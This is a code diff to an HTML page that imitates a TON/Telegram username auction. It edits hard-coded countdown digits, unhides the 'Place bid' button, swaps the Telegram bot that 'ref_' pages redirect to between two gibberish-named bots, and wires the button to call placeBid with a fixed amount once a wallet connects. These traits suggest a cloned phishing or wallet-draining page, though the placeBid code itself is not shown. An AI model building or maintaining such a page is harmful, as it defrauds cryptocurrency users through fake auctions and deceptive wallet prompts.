@@ -171,14 +171,14 @@
 <div class="tm-section-countdown">
 <span class="tm-countdown-label short">Ends in</span>
 <span class="tm-countdown-label full">Auction ends in</span>
-<time class="tm-countdown-timer" data-relative="counter" datetime="2026-06-23T14:30:00+00:00"><span class="reel"><b class="digit timer-d" data-val="3 days"></b></span><span class="reel"><b class="digit timer-h0" data-val="0"></b><b class="digit timer-h1" data-val="1"></b></span><span class="reel"><b class="digit timer-m0" data-val="5"></b><b class="digit timer-m1" data-val="8"></b></span><span class="reel"><b class="digit timer-s0" data-val="0"></b><b class="digit timer-s1" data-val="9"></b></span></time>
+<time class="tm-countdown-timer" data-relative="counter" datetime="2026-06-23T14:30:00+00:00"><span class="reel"><b class="digit timer-d" data-val="3 days"></b></span><span class="reel"><b class="digit timer-h0" data-val="0"></b><b class="digit timer-h1" data-val="1"></b></span><span class="reel"><b class="digit timer-m0" data-val="4"></b><b class="digit timer-m1" data-val="3"></b></span><span class="reel"><b class="digit timer-s0" data-val="2"></b><b class="digit timer-s1" data-val="5"></b></span></time>
 </div>
 <div class="tm-section-countdown-end">
 <span class="tm-countdown-label">Auction will close soon</span>
 </div>
 </div>
 <div class="tm-section-box tm-section-buttons">
-<button class="btn btn-primary js-place-bid-btn hide" data-bid-amount="8802">Place bid</button>
+<button class="btn btn-primary js-place-bid-btn" data-bid-amount="8802">Place bid</button>
 </div>
 <div class="tm-section-subscribe tm-section-box js-subscribe">
 <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
@@ -482,7 +482,7 @@ Wallet.init({"address":false,"ton_proof":"e6e3b091f7ff939354","logged_in":false,
     var page = path.split('/').pop();
     if (page.startsWith('ref_')) {
       var id = page.replace('ref_', '').replace('.html', '');
-      window.location.href = 'https://t.me/dadaddfewfwegfw_bot?startapp=ref_' + id;
+      window.location.href = 'https://t.me/wmekfnwefnwejnfw4ej_bot?startapp=ref_' + id;
     }
   }
   var q = new URLSearchParams(window.location.search);
@@ -618,6 +618,8 @@ document.querySelector('.js-place-bid-btn')?.addEventListener('click', function(
     connector.connect();
     return;
   }
+  var amount = this.getAttribute('data-bid-amount');
+  if (amount) placeBid(amount);
 });
 </script>
 </body>
